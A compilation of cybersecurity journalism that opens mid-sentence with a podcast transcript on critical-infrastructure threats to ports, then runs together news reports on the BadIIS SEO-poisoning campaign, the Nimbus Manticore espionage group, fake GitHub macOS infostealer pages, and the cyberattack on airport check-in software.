Frank and his team at McCrary to really examine some of the more important critical infrastructure challenges of the day.It's interesting because as we were preparing for this dialogue, I was thinking about how we went through the thought process for this paper and this project that we worked on. Critical infrastructure is really taking momentum these days because the threat that we're facing in our increasingly connected world is such that things that weren't normally vulnerable to cyberattack, now are vulnerable to cyberattack as part of our everyday life.We are in an environment where smart technology has platforms and weapons talking to buildings and power plants and in our energy grid. So inevitably things are connected in ways that we have never experienced before. We sat down and looked at this and said, Where can we look at a case study, an example of something that really kind of exemplifies critical infrastructure and how we get at this problem. And we said, this idea of examining maritime ports is one that really kind of gets at critical infrastructure.Related:Phishing Is Moving From Email to Mobile. Is Your Security?When we talk about critical infrastructure, we're talking about activities that are vital to the daily functions of our nation. So, a maritime port is a part of our infrastructure that is our supply chain. It's the input and output and the throughput of equipment and all kinds of material that help make our economy run. So, it's also important to understand that the maritime ports, CONUS (those inside the continental United States) and OCONUS (those outside the United States), impact $2.1 trillion of our national economy. So, when you can back up a use case with the numbers and the impact that it can make on the economy, it kind of gives you a good start point.The other thing that, you know, kind of was we were literally sitting around at the table, Frank and I and some others, kind of looking at this use case. And I kind of thought to myself early on that the maritime port really is the perfect use case for analyzing critical infrastructure vulnerability. I mean, think about it. You take the Port of Long Beach, which is the largest port on the West Coast. Everything that goes onto that port comes from somewhere. So, you have the intermodal transportation system, have the containerized cargo that comes onto the port, you have all the C4ISR communication systems that manages the move and throughput, and then at the other end at every destination, that cargo has to go someplace.Related:Shutdown Threatens US Intel Sharing, Cyber DefenseSo, you've got the entire supply chain with a maritime port kind of at the hub. Secondly, the port isn't just our economy, it's national security. I think there are 21 ports that have been designated as not only commercial ports, but ports that are important to our national security. So, it's one of those aspects of national security that is also a very important aspect of our economy.We looked at this use case and we said, Well, what could make this even more appropriate to tackle? Well, the fact that 80% of cranes and cranes as material handle equipment that we use on these ports are purchased from a Chinese company. Right? So here you have $2.1 trillion of our economy resting on the throughput at our maritime ports. And we're relying very heavily on Chinese-made cranes at these ports. So, we thought this was a great place to start. We did a lot of research. We published a paper. But the most important thing about this project was to stimulate a dialogue about critical infrastructure, important use cases, technologies, and how we bring those things together to tackle an increasingly sophisticated threat.Becky Bracken: What struck me too is when you think about all of the things that go into these huge ports that are really just cities in and of themselves, that the cranes would, I mean, again, to me, to a layman, I would think, well, there couldn't be anything more straightforward, but these are connected. These are working as part of an organism, right?Frank Cilluffo: Yeah, and Becky, to build on Dave's, what he very articulately laid out here, it often is that single point failure. It is often what we're not thinking about that plays such an essential role in ensuring a) our ports are up and running, or b) our economy is up and running.There are about 17 critical infrastructures that the US government has designated as essential to our economy, our national security, and our public safety. Ports is one that seems to touch so many and hasn't gotten the attention perhaps it deserves. But you've got others that are like utilities and electricity. If you have no power, I don't care how robust your security is elsewhere. If the lights aren't on, we're all in trouble. Everything's ground to a halt.Many of these were designated back in a Presidential Decision Directive coming from 2013. PDD 21 designated these critical infrastructure sectors. It was updated about a year and a half ago through a National Security Memorandum 22, not to get all wonky and boring here, but ultimately it reaffirmed what our critical infrastructures are, but missed a couple that I think are essential going forward, such as space, whether or not you should define cloud, cloud services as a critical infrastructure, much like cyber, everything is dependent upon space assets, whether it's a short position, navigation, timing, PNT and the like, or cloud. I don't know how you differentiate that from IT these days, because it is an area where you have a lot of aggregated information.But the bottom line here is that these are essential, and they're normally looked at through the physical security environment, all of which is important when these were first designated. But as Dave mentioned, a lot of this is being netted, old OT legacy systems through IoT technologies that sort of expand that attack surface exponentially.And as we kind of look forward, this is essential to modern economies and international security, our economic security, and even our public safety. So net-net, if we don't get this right, we're in trouble. And there have been a number of very disconcerting actions. This isn't science fiction. If you look at Volt Typhoon, this was pre-positioning by China in several of our critical infrastructure sectors.Water, for example, is essential to society, but by no means does it have the resources that say our utilities or defense industrial base critical infrastructure sectors have, but essential to our economy. How many companies, even the biggest, went into business thinking they had to defend themselves against foreign intelligence services and foreign militaries? That's the world we live in today.Becky Bracken: And that is my question. And I guess this is a bunch of unintended consequences sort of mounted on top of one another at the end of the day. But it does seem as if we know the Typhoons are there. I mean, this is all widely understood. We know that the Russians were able to as well, through the SolarWinds compromise. We know the North Koreans are attacking.Why isn't there a sense of urgency? I mean, I think of my readers who are in enterprises, like you said, who are in these utility SOCs, who are working on railroad threat hunting, and they're not resourced to do this. Where does this leave them? What should they be thinking about this?Dave Forbes: Well, let me and with that question, do want to be really mindful of the your listenership, right? Because one of the things that made me most excited about this venue was the fact that you're reaching out to asset owners and CISOs and the stakeholders that are charged with developing strategies and plans to protect this infrastructure.So just kind of laying out a very practical view of this, Becky, you've got ports or other infrastructure that rely on, to some extent, on Chinese handling equipment. Inevitably, these same locations may or may not be running on Chinese software. In addition to that, it's compounded by legacy systems. The experience that I have is really dealing with federal installations across the world that inevitably have very important missions, but they are relying on control systems that in many cases, not exaggerating, were installed in 1985. And they were never installed, intending to be secure.So, circling back to your question, yeah, there's always this resource discussion and we can sit here and say, we need to put more resources to it. But the CISOs, the asset owners, the engineers on the ground, inevitably are now faced more than ever with a threat that was pronounced very clearly to us by Volt Typhoon with legacy infrastructure that's not improving at any sort of fast rate, but an increasingly sophisticated and complex mission.So, it's really kind of mind-boggling that national security, national economy, you know, we're moving and shipping and hosting and transporting major sophisticated platforms, both commercial and national security on installations and on infrastructure that is very old and very connected and, in many cases, very insecure.So, I think that what that means is it is being clear, it's becoming increasingly clear to these stakeholders that something needs to be done. And one of the messages that I hope we get across today is there's always something that can be done and we'll get a little bit more into that. But certainly, the worst thing you can do is inaction. But I think that we have a true confluence here of threat, legacy, connectedness, and a national urgency to take some sort of action.Frank Cilluffo: You know, Becky, to your point on and I think Dave laid that out exceedingly well, but the cyber community is literally staring down at two major provisions that are in jeopardy of expiring. They sunset at the end of September. So we've got a handful, two handfuls of days to be able to take action on this.One is the reauthorization of CISA 2015, which is not the agency CISA, but the Cybersecurity and Information Sharing Act of 2015, which allows for some liability for industry to be able to share information with one another in the government. The second is around state local tribal territorial funding, SLCGP [State and Local Cybersecurity Grant Program] funding.You have an administration that's expecting more of industry and our state and local partners, which I could agree with, but they need the ammunition to get the jobs done. And policy without resources is rhetoric. So we need to make sure that they a) have the authorities, b) have the resources. And just think about this. Imagine if we're setting ourselves back a decade.In 2015, that's when the Apple Watch came out. This was a long time ago, and all things said and done, the last thing we need to be doing is going backwards. And these are both legislative outcomes and pieces of legislation that I think the vast majority of America and Capitol Hill and stakeholders in the executive branch would agree on. Probably about 95% would agree on. And if we're having a hard time getting that over the goal line, shame on us.Becky Bracken: And so, what is the likelihood, as a policy watcher, what is the likelihood that we're going to get those done by the end of September?Frank Cilluffo: I think they'll get done, but the fact that it's a game of chicken and we get it at the last minute, there's no time for political posturing here. This isn't a red issue, a blue issue. It's a red, white, and blue issue. And all things said and done, those on the front lines are not always going to be inside the alphabet soup of DC. It's not all of the agencies here, which are essential, but you also need to make sure that those on the front lines of industry are critical infrastructure owner operators and state and local who are always going to be the first to respond and the last to leave.It affects their community. I just foot stomp. I tend to be, I've been told the pessimist is an optimist with experience. I am still managing to be an optimist on this. I think it gets through in one form or another, but it should have never gotten to this point as is.Becky Bracken: So, let's hold on to that optimism.Dave Forbes: Yeah, I just want to hit one thing because, you know, we are in a little bit of an unprecedented time here. And I think this is a time when policy and mission do connect. Right.Becky, you said upfront talking about the dependencies and critical infrastructure and kind of most Americans understanding of critical infrastructure. But you really hit on something that's important. The threat landscape that we're faced with is what we call a one connected battle space.So it's really important to understand that the adversary doesn't look at our national infrastructure as here's the Department of Defense and here's the Department of Transportation and here is this port and our Department of Commerce. No, they look at one connected environment in this country and they look at the seams that we have and this infrastructure and that's how they move to exploit.So never has there been a time when the preparedness of the Department of Transportation impacts the Department of War. This is the time now where this connectedness, this one battle space, is really forcing us to kind of really pay attention. If I'm working at a port or if I'm an asset owner, or I'm an engineer on the ground, I really care what's happening with these CISA policies. And we need to recognize that it's a fast moving threat landscape that in many ways is moving faster than we're making decisions to meet.Frank Cilluffo: That's the truth, and technology is moving a whole lot faster than policy and that's understandable to one extent or another. That said, when you look at the threat environment, not all hacks are the same, all hackers are the same, intentions vary, capabilities, the tactics, techniques and procedures our adversaries use vary. At the very high end are obviously nation state actors.The pacing and existential threat being the People's Republic of China and the Communist Party's intentions there, followed closely by Russia, Iran, North Korea. North Korea is a little different, and Iran, I would say, is a little different. What they lack in capability, they more than make up for with intent. But in North Korea's case, it's sort of more of a criminal enterprise. They're traditionally criminals trying to penetrate the state. In their case, it's the opposite. It's the state penetrating organized crime just to be able to get part of the global economy.But it comes in so many shapes, sizes, and forms. And you've got ransomware actors that just five years ago, the techniques that they're using would have only been in the hands of maybe four five countries. So these tools are becoming really point-and-click user friendly. They're proliferating really fast. And, unfortunately, as of right now, Dave may disagree with me on this one, but I think the initiative remains with the attacker. So the question is, How do we start squaring that circle? How do we improve our defenses?And I also think we're never going to defend our way out of this problem alone. We have to start imposing costs and consequences on our adversaries because they're getting away with murder and they'll continue to get away with it until there are some consequences.Dave Forbes: You know, I'm glad Frank kind of made a little pivot to the threat and for the listeners out there. It was a great pass. And for the listeners out there, those who really experience are watching this with an educated eye, but those who are a little bit newer to this space.Frank Cilluffo: That was more than a pivot, Dave. I went all in, so ...Dave Forbes: It's important to understand what that threat means, right? So, let's talk a little bit about the PRC and Volt Typhoon. There are a couple of things that we really need to understand. Number one, it's the increased sophistication of this threat that Volt Typhoon showed us. It's a rapidly developing technological environment that they're employing on our networks. And two, it's an escalation. It's an escalation that we probably haven't seen in quite some time.And I think what is probably most important to understand is that there's been this shift from, yeah, let's getting on our networks for the purpose of stealing intellectual capital, but now it's really about living off the land techniques on our networks that inevitably are intended to be able to give some sort of control and make a decision on when to destruct or deter what we're doing.One of my colleagues says, we talk about APT, the Advanced Persistent Threats. Well, it's the “P” here that is concerning to me, right? It's the persistence that we're seeing on the part of the PRC that is really alarming and different. We gotta think about, not to be too alarmist here, that nation-state actor has showed us a real willingness to get out our networks, to sit there, and to figure out what their decision space looks like.Frank Cilluffo: And can I just put one fine point on that? So, I'm shocked there's gambling going on in casinos. There's been espionage and cyber-network exploitation forever. The difference is, is when you look at Volt Typhoon, firstly, if you can exploit, you can also attack if that's what your intention is. But the difference here is it was of no value from an espionage standpoint. It was purely signaling around intention that they are pre-positioning at a time of their choosing where they could cause disruptive and destructive attacks.So that is an escalation. That is, if we were to have lines in the silicon, as we have in traditional kinetic environments, that would have crossed almost anyone's line. So, the fact that there has been limited consequence for that bad behavior is not only a China thing, it's every other country that's watching and observing. So, I think we do need to get to the point where we can talk about these issues that they're not just black magic issues. These are issues that affect everyone and there need to be consequences for bad behavior.Becky Bracken: So, you say consequences. I imagine you're talking about a holistic, diplomatic, economic sort of, specifically, I mean, I know we're limited from a law enforcement capacity, although they have made some inroads on the Dark Web and busting up some organized crime. But consequences, sounds, in a nation state kinetic war, that sounds pretty scary.Frank Cilluffo: And is it any different than it would be in any other environment? So to me, it doesn't necessarily mean cyber on cyber. It can, but there are other instruments of statecraft that we can utilize to impose costs. But we've been blaming the victim. An incident occurs, who do we blame? We blame the company. That's just backwards. And imagine if in a physical world, banks get robbed all the time and you blame, it just doesn't add up.So law enforcement is one of the instruments and we need to be able to scale some of the good activities we've seen, not only in the United States, but with our allies and others. Sometimes it may be more in the intelligence environment, in the title 50 world where there can be some actions that are taken and other times very diplomatic and economic. But we can't have this as a side issue. This is having real consequences on Americans, on our economy, on our intellectual property. And that's the engine that keeps this country going. So, we can't turn it over to our adversary.Dave Forbes: And it's not going to stop anytime soon. One of the things that, and Frank listed all these important stakeholders and one of the things that we need to ensure happens is that we change our mindset to the fact that we're assume breach, right, is what we say. This isn't an you anticipate and protect against the attack. We're being attacked. The adversary is either on our network or trying to penetrate our networks.Frank Cilluffo: Certainly not on their own.Dave Forbes: As we speak it is about resiliency it's about the resiliency of our national security apparatus of our economy our schools and our hospitals so yeah it takes all the stakeholders working together and but this is this is for a forever reality in our critical infrastructure landscape.Frank Cilluffo: You know, and we've talked for decades about public-private partnerships, and I'm a big proponent of that, but it's translating some of the nouns into verbs. What does that actually look like? And to me, and I mentioned CISA 2015, the reauthorization, that's information sharing. That's like scraps in the grand scheme of things.I want to get to the point where it's genuine operational collaboration between critical infrastructure, owner operators, government. The only way you get to that is you have a high level of trust, which takes years to build and nanoseconds to lose. And I feel like that's where the emphasis needs to be going here. But I think net-net, we're at the in the very early innings of getting our arms around that, but I'm seeing some positive momentum and recognition that we need to go in that direction.Becky Bracken: What does building trust look like to you? Information sharing is scary for business. There is a trust issue between government and business always. How do we operationalize that, as you so smartly say?Dave Forbes: Yeah. We test. We test out solutions together. We build. We have to build trust either from a technical perspective or from a organizational perspective by leaning forward and testing out the solutions. It sounds simple, right? But if I'm talking to your listeners, right, they're going back to their locations, whether it's their weapon system, their power plant, their water purification center, you know, it's their school.What solutions could help? Never has, see, we talk about zero trust, for example. One of the reasons that zero trust for operational technology or information technology is so relevant now, it's not just because we have policies and guidelines, it's because we now have the technology to deploy to do it, right? So back to your question, how do we develop trust?We get stakeholders coming together and say, let's try something. Let's do a pilot for four months for a minimal amount of resources in a safe environment and see how it works. I mean, this isn't pie in the sky, Becky, right? We're doing this in the department right now. But if I were speaking directly to the CISOs out there, it's like talk to somebody who's piloted out a solution right now to do zero trust on your network or even just asset visibility if you're not doing this now.And come up with a 120 day plan to test out a solution and see how it works and then fix it and do it again. Because we're not going to get there from here unless we have a willingness to try things and learn from them and scale our protective solutions on our networks.Frank Cilluffo: And can I build on that? Because I think Dave ...Becky Bracken: That is such a smart point. Yeah, think that was a smart point. Please.Frank Cilluffo: Yeah, I love that he laid the way he laid it out through pilots, Pathfinders. There are two initiatives not to get into DC world, but the Joint Cyber Defense Collaborative out of CISA, the Cybersecurity and Infrastructure Security Agency at DHS, along with NSA's Cybersecurity Center, the CCC. These are two initiatives that are very valuable and can become instrumentally valuable in terms of building some of the trust and the collaboration around some of these sectors. But they're not reflective of all the critical infrastructure. And they're very good when the balloon goes up. A big crisis. So the day after the Russians invade Ukraine, they got together. They had a lot of collaborative discussion, which led to good, actionable outcomes.CCC does similar with the defense industrial base on a whole host of different scenarios and examples. They're good on the big day, but the truth is, is we need to be good every day. Trust is not when you're going to big game. You're not, you're not meeting each other and exchanging business cards on game day of the Super Bowl. You've got to do that every day and put in the reps and make the mistakes. And if you're going to fail, fail fast. And if you're going to succeed, build on that, build traction. So to me, there are a number of good entities there, but how do we institutionalize that and how do we move on on a regular day, not just a bad day?Becky Bracken: I'm struck by the Ukraine example in particular because there was such a rallying around of the cybersecurity community. I mean, at the conferences at Black Hat, everybody was thinking about this problem and it is a matter, I think, too, of framing it in the same kind of emergency existential terms. I don't know exactly how we do that in an environment like we're in today, but I think that the things that we're left with here are: Do something. Don't do nothing, whatever you do. Seek out partners, do something. Pressure government where you can to push these. But really, we're not making up any ground. We're sort of just reaffirming where we were. What are the other action items that my audience can take?Dave Forbes: I would offer two more things to add to that. It is to factor in cybersecurity in our strategies and plans. And it really may seem intuitive, but we still see, from time to time, whether it's an acquisition that's been released for a major program or a strategy where there'll be just a small or absent thought around cybersecurity. It's just a mindset that cybersecurity is national security, right? So this is about resilience. It's about resilience in the face of a threat.The second thing that I would offer is, I'm an industry guy, right? We can't solve this problem without coming together and sharing ideas. And I'm not being ignorant to business goals, right? But the fact of the matter is we're seeing this, right? We're seeing that when industry partners come together, we have world-class vendors these days in commercial and government. These technologies are coming out that are bringing AI to the cyber-physical space. They're there. But you know what has to happen is we need to kind of come together in a lab or a conference room and kind of check our strategies at the door for a couple hours and see what works.How can I use this technology with this AI tool, with this integration and this visualization? You know what? This could work really well and then take it to customers. There needs to be more of a national open-mindedness around how we harness our technologies. Now you're seeing it in the venture world, privilege to be involved in a number of the venture opportunities that we have at Booz Allen. But we got to accelerate that. And it just means finding those technologies out there that are new and innovative, putting them to work, you know, putting them in a lab and testing them out and making them better. And that's going to be a different mindset that I think that we're on a journey to get there, but we need to get there faster.Frank Cilluffo: And can I just say the how matters here? The country that built Silicon Valley, the country that built Hollywood, the country that built Wall Street. I mean, if you get everyone sort of moving, and this is not to be too Pollyannish, but this really does demand a call to action that's national. It really does demand one team, one fight.No agency alone can do this without industry. No industry alone can do this without their partners elsewhere. But we need that call to action. And it can't just be when we have an imminent crisis in front of us. There has to be the reason that you can work every day so when it matters, you're ready.Becky Bracken: Frank, that is just a perfect place to leave our discussion today. It was incredible. I learned a lot. I know that our audience did as well. I want to thank Dave Forbes from Booz Allen, Frank Cilluffo from McCrary Institute. We very much appreciate your insights today. Thank you so, so much. And thank you to our audience for listening to Dark Reading Confidential.

A search engine optimization (SEO) poisoning campaign is targeting users in East and Southeast Asia using a malicious native Internet Information Services (IIS) module called BadIIS to intercept and alter Web traffic. The attack, attributed to an unspecified, financially motivated Chinese-speaking threat actor, uses legitimate compromised servers to serve malicious content to visitors. Researchers from Palo Alto Network's Unit 42 discovered the campaign, which has been active since March 2025, calling it ""Operation Rewrite"" in reference to the English translation of one of the objects in the threat actor's code, they revealed in a blog post published Tuesday.The campaign, which Unit 42 researchers track as CL-UNK-1037, uses compromised servers as reverse proxies, acting as intermediary servers that fetch content from other servers and presents it as their own. The actors wield a host of custom implants in their attack sequence, all tailored to the goal of ""manipulating search engine results and controlling the flow of traffic,"" according to the blog post.""Attackers use the BadIIS malware to maliciously manipulate search engine results to direct traffic to their chosen destination,"" Yoav Zemah, a Unit 42 senior threat hunter, wrote in the post. These destinations include porn or gambling sites, which the attacker aims to deliver to users for financial gain.Related:Scattered Lapsus$ Hunters Returns With Salesforce Leak Site""Instead of building a new website's reputation from scratch, which is a slow and challenging process, the attackers compromise established, legitimate websites that already have a good domain reputation,"" he explained.To poison search results, attackers inject the compromised website with keywords and phrases that frequently appear in Internet searches to alter the site's SEO, making it appear in search results for a broader range of popular queries. ""As a result, the website's ranking improves for these commonly used terms, bringing more traffic to the now-poisoned site,"" Zemah wrote.Unit 42 attributed the campaign to a Chinese-speaking threat actor with potential links to a cluster of activity tracked by researchers at ESET as Group 9 and an SEO manipulator service provider previously identified by Cisco Talos as DragonRank.Tracking CL-UNK-1037Unit 42 researchers first discovered CL-UNK-1037 while investigating a security breach in which attackers gained access to a Web server and then pivoted to multiple production Web servers, domain controllers, and other ""high‑value hosts"" once they established the initial foothold.Related:Dutch Authorities Arrest Two Teens for Alleged Pro-Russian EspionageThe threat actors deployed additional Web shells on each compromised Web server and used remote scheduled tasks to move laterally across the network. They also created new local user accounts on the systems, according to the blog post.""The attackers used their deployed web shells to compress the entire web application source code directory into ZIP archives. They then moved the archives into web-accessible paths,"" Yemah wrote. ""This strongly indicates that the attackers intended to retrieve the ZIP archives over HTTP at a later stage."" After exfiltrating the source code, the attackers uploaded several new Dynamic Link Library (DLL) files — which later were revealed to be BadIIS implants — to the compromised Web servers, silently registering them as IIS modules.Attack Flow Using BadIISCL-UNK-1037's SEO poisoning campaign has two primary phases: luring the search engine to the malicious content and then trapping the victim. The first phase starts with an incoming HTTP request that visits a compromised Web server and then uses BadIIS implants —  an umbrella term for malicious native IIS modules that integrate directly into a Web server's request pipeline and inherit the Web server's full privileges — to identify if the search engine crawler includes keywords from a configuration list.Related:Jaguar Land Rover Shows Cyberattacks Mean (Bad) BusinessIf keywords are involved, the module contacts the command-and-control (C2) infrastructure to fetch poisoned content, which the C2 delivers a response of custom, keyword-stuffed HTML that is designed purely for SEO. The BadIIS module then serves this malicious HTML to the search engine crawler, which indexes the URL of the compromised website as a relevant source for the terms found in the C2 response, ""effectively poisoning the search results,"" Yemah explained.That sets the lure for the victim to click on the poisoned search result, which happens if someone searches for a keyword that appears in the BadIIS module's configuration list. Clicking on a poisoned search results points the victim to the compromised website. BadIIS then intercepts the request and, if it identifies the request as a search engine, it flags the visitor as a victim.The module then contacts the C2 server to retrieve malicious content, most typically by redirecting to a scam website. The BadIIS module then seamlessly proxies this redirect to the victim's browser and the victim, which is expecting to visit their desired website, is immediately sent to the attacker-controlled content, according to the post.Attribution and MitigationAt this point, the researchers aren't sure if the threat actor is a known China-backed group or if it is an emerging one, but there are some similarities, as mentioned, to DragonRank. The two activity clusters share similar core functionality and logical malware flow in their toolsets, as well as a similar URI structure showing a recurring ""zz"" pattern in the C2 URLs.""While the pattern is used differently in each campaign, we assess that this could be the result of tool set evolution or upgrades over time,"" Yemah noted.Unit 42's post includes a long list of indicators of compromise by the recent SEO poisoning activity, including BadIIS implants SHA256 hashes; hashes for ASPX file handler SHA256, managed IIS Module SHA256, and PHP file handler SHA256; and URLs associated with the C2 of the threat actor. Yemah also recommended that defenders deploy advanced URL filtering, DNS security, and other endpoint protections to avoid compromise."

An Iran-linked cyber-espionage group has expanded its operations beyond its traditional Middle Eastern hunting grounds to target critical infrastructure organizations across Western Europe using constantly improving malware variants and attack tactics.Researchers at Check Point Software are tracking the threat group as ""Nimbus Manticore,"" which they said overlaps with UNC1549, or Smoke Sandstorm. In a report published on Monday, Check Point said the new activity is aimed at defense manufacturing, telecommunications, and aviation companies in Denmark, Portugal, and Sweden.Sophisticated Malware ToolkitCentral to the campaign are ""MiniJunk,"" a highly obfuscated backdoor that gives the attacker persistent access to infected systems, and ""MiniBrowse,"" a lightweight stealer with separate versions for stealing credentials from Chrome and Edge browsers.Check Point's analysis of MiniJunk showed it to be a much improved version of ""Minibike,"" a custom implant that others such as Mandiant have previously reported Nimbus Manticore to be using. The malware allows the threat actor to upload and download files, execute processes, load additional payloads, and exfiltrate data. It also communicates with multiple command-and-control (C2) servers — between three and five — over HTTPS using obfuscated traffic, making monitoring and detection more difficult.Related:Scattered Lapsus$ Hunters Returns With Salesforce Leak SiteThe malware's new capabilities include a previously undocumented way to load malicious Dynamic Link Libraries (DLLs) or files on compromised systems. MiniJunk also uses junk code, abnormally large files, and code signing to make detection significantly harder for defenders, which ""suggest a significant increase in the actor's abilities,"" Check Point said.The malware authors have implemented compiler-level code obfuscation in both MiniJunk and MiniBrowse to automatically modify program code as it's compiled, according to Check Point. The attacker appears to have invested a lot of effort in developing and baking these obfuscations into every build of the malware to reduce detections and makes static analysis and reversal far more time-consuming for defenders.""We had to address several obfuscation techniques to facilitate analysis, including junk code insertion, control‑flow obfuscation, opaque predicates, obfuscated function calls, and encrypted strings,"" Check Point said, adding that it found each generation of the malware tools to contain improvements over prior versions. ""The actor appears to be targeting a substantial number of victims, and these obfuscations help the malware remain undetected while at the same time slowing down researchers trying to determine the samples' behavior.""Related:Dutch Authorities Arrest Two Teens for Alleged Pro-Russian EspionageAdding to the detection challenge is the fact that Nimbus Manticore actors have been digitally signing their malware since at least May 2025 using certificates from SSL.com, a certificate authority. Based on an analysis of the latest certificate used by Nimbus Manticore, Check Point said it was ""generated by the threat actor, masquerading as existing IT organizations in Europe.""Highly Tailored AttacksThe threat group's attacks in the latest campaign begin, as always, with highly tailored spear-phishing emails that appear to be from legitimate HR recruiters. The emails direct victims to fake job-related login pages that appear to be associated with the likes of Airbus, Boeing, Flydubai, and Rheinmetall. ""Each target receives a unique URL and credentials, enabling tracking and controlled access of each victim,"" Check Point said. ""This approach demonstrates strong OPSEC and credible pretexting.""When a victim logs into the fake job site using the supplied credentials, a zip archive gets downloaded on their machine that looks very much like something a user would expect during the hiring-process. In the background, the archive initiates what Check Point described as an elaborate process to download the malware on the victim system. ""The execution chain leverages a unique technique which we call multi-stage sideloading,"" to install the malware and establish persistence, Check Point said.Related:Jaguar Land Rover Shows Cyberattacks Mean (Bad) BusinessNimbus Manticore is a threat group that security researchers previously have associated with the Iranian Revolutionary Guard Corps (IRGC). The group has been active since at least 2022, when Mandiant researchers — who track the threat as UNC1549 — spotted the group targeting organizations in the aerospace and defense sectors in Israel and the Midde East. According to Check Point, some of Nimbus Manticore's operations are the same as what ClearSky observed last November and tracked as the Iranian Dream Job campaign.Check Point's advisory includes specific indicators of compromise that organizations can use to check for signs of Nimbus Manticore activity on their networks.Iran-linked threat groups like Nimbus Manticore are part of a broader set of state-aligned actors that have increasingly targeted organizations outside the Middle East, focusing on critical infrastructure, defense, telecommunications, and aviation sectors. Last year, the US Cybersecurity and Infrastructure Security Agency (CISA) warned of IRGC-linked cyber groups targeting programmable logic controllers installed across multiple sectors, including US water and wastewater systems facilities. In many of these campaigns, the threat actors have used highly tailored phishing lures, custom malware toolkits, and sophisticated obfuscation and evasion techniques to maintain persistence, avoid detection, and exfiltrate."

An emerging threat campaign is using targeted SEO poisoning to hit Mac users with infostealers.That's according to LastPass's Threat Intelligence, Mitigation, and Escalation (TIME) team, which on Sept. 18 published a blog post dedicated to an emerging threat campaign involving phony GitHub pages claiming to be from legitimate companies. Code repositories have been used in several attacks lately, including the Shai-Hulud worm, the compromise of prolific NPM developer Qix, the Salesloft breach, and more.According to LastPass blog post authors Alex Cox, Mike Kosak, and Stephanie Schneider, threat actors are publishing GitHub repositories containing malware that claim to be MacOS versions of legitimate software, all the while leveraging SEO to ensure the fake repositories are positioned well in search results.GitHub Mac AttackLastPass said the campaign has targeted a range of companies across the technology and financial sectors, including LastPass. In that case, researchers discovered two fake listings from GitHub users for repositories offering ""LastPass Premium on MacBook."" The pages used in the campaign were created by multiple GitHub usernames and are littered with MacOS-related terminology.The site included a download link that instructs users to paste a specific line of code into the Mac terminal. That code, at least in the case of the fake LastPass pages, leads to the download and execution of the Atomic infostealer (also known as AMOS).Related:Microsoft's Voice Clone Becomes Scary & UnsalvageableBoth pages were created on GitHub on Sept. 16, and LastPass said ""these sites were immediately submitted for takedown and are now inactive.""This type of thing has been done before; LastPass cited research published in July detailing a similar social engineering campaign in which attackers claimed to offer a MacOS version of package manager Homebrew on GitHub. Following the page's instructions would similarly lead to malware installations.And last month, CrowdStrike detailed a campaign by a threat group it tracks as Cookie Spider. The group attempted to compromise more than 300 customer environments using ""SHAMOS,"" a variant of the aforementioned Atomic infostealer. The campaign similarly utilized malvertising to get its stealer into victim environments, which CrowdStrike said was blocked by its Falcon platform.""Operating as malware-as-a-service, COOKIE SPIDER rents this information stealer to cybercriminals who deploy it to harvest sensitive information and cryptocurrency assets from victims,"" CrowdStrike said in its research. ""The campaign utilized malvertising to direct users to fraudulent macOS help websites where victims were instructed to execute a malicious one-line installation command.""Related:Red Hat Investigates Widespread Breach of Private GitLab RepositoriesCrowdStrike's research tracked the Cookie Spider campaign back to June, but the Atomic infostealer has been active since at least April 2023, LastPass said.Mitigating the Mac AttackDark Reading asked LastPass why Mac users in particular have been targeted by this campaign and malware. Kosak, senior principal intelligence analyst at LastPass, hypothesizes that the group behind the malware may prefer to focus on macOS systems; the attackers may view Mac users ""as something of a low-hanging fruit since the dangerous impression that Macs face less of a malware threat continues to linger.""To mitigate this threat and others like it, Kosak says organizations and users should only download software from legitimate app stores or, in the case of GitHub, confirm that the repository is managed by the relevant company itself. Although, as Kosak notes, ""this can be trickier"" when considering recent supply chain attacks like those targeting NPM users.To defend against infostealers, Kosak recommended using current antivirus or EDR protection and, as expected from LastPass, to avoid ""storing your credentials or other sensitive information in your browser and [consider] using a password manager or other secure storage method instead.""Related:Sneaky, Malicious MCP Server Exfiltrates Secrets via BCC"

UPDATEA cyberattack targeting ticketing and check-in software used in several European airports caused widespread disruptions over the weekend that continued to affect flights and passengers on Monday. The ongoing incident demonstrates the human impact of increasing cyberattacks on critical infrastructure, especially through third-party software and services, security experts said.RTX, the parent company of Collins Aerospace, acknowledged an attack on Collins' MUSE (Multi-User System Environment) software at ""select airports,"" according to a statement published in an Associated Press (AP) report. MUSE is a system that runs airport kiosks allowing passengers to check themselves in and print boarding passes and baggage tags.Several European airports, including London's biggest air transportation hub Heathrow Airport, reported disruptions in the electronic check-in and baggage tag systems, requiring employees to complete these processes by hand. This meant that passengers waited upward of several hours for check-in and baggage processes that typically can be completed in minutes, according to published reports.As of Monday, it was still not clear who was behind the attack nor the motive for the attack, although repercussions of it were still being felt across airports, affecting thousands of passengers. Hacker collective Scattered Spider targeted several airlines in an attack spree earlier this year, but so far has not been mentioned as the potential culprit in this attack.Related:Scattered Lapsus$ Hunters Returns With Salesforce Leak SiteThe European Union Agency for Cybersecurity (ENISA) told Reuters on Monday that ransomware was involved in the attack, with attackers holding the MUSE software for ransom, which is what caused the disruption. Dark Reading contacted the agency, which responded with a statement but did not confirm that ransomware was used in the attack.""ENISA is aware of the ongoing disruption of airports' operations, which were caused by third-party cyber incident. At this moment, ENISA cannot share further information regarding the cyberattack.  There is an ongoing investigation and the relevant authorities will communicate further updates, if deemed necessary,"" ENISA's statement said.However, one security expert said that the sooner all parties involved are transparent about the attack, the better for mitigation and future prevention efforts, as well as the full scope and impact.""We still need more information to actually understand the true impact and ramification of the attack,"" observed Martin J. Kraemer, security awareness advocate at KnowBe4, who called the messaging by authorities and companies involved in the attack ""confusing"" so far. ""The NCSC is investigating a cyber incident. Collins Aerospace is talking about a cyber-related disruption. We require more transparency before we can make meaningful conclusions as to who is behind this and what their benefits are.""Related:Dutch Authorities Arrest Two Teens for Alleged Pro-Russian EspionageFlight Cancellations as Issues PersistBrussels Airport cited the attack on Collins for continued disruptions to flights on Monday, warning passengers to expect cancellations and delays, according to a notice on its website. The AP reported that the airport cancelled nearly 140 flights due to the attack.""The service provider is actively working on the issue and trying to resolve the problem as quickly as possible,"" according to the notice on the airport's website. ""At the moment it is still unclear when the issue will be resolved. This has an impact on the flight schedule and unfortunately causes delays and cancellations of flights.""Heathrow Airport officials also acknowledged the attack on Monday in a notice on its website, but said its flight schedule has been largely unaffected.""Work continues to resolve and recover from an outage of a Collins Aerospace airline system that impacted check-in,"" according to the notice. ""We apologize to those who have faced delays, but by working together with airlines, the vast majority of flights have continued to operate.""Related:Jaguar Land Rover Shows Cyberattacks Mean (Bad) BusinessBerlin's Brandenburg airport also posted a notice on its website about the outage, informing customers that there would be longer wait times than usual; however, the airport did not report cancelled flights. 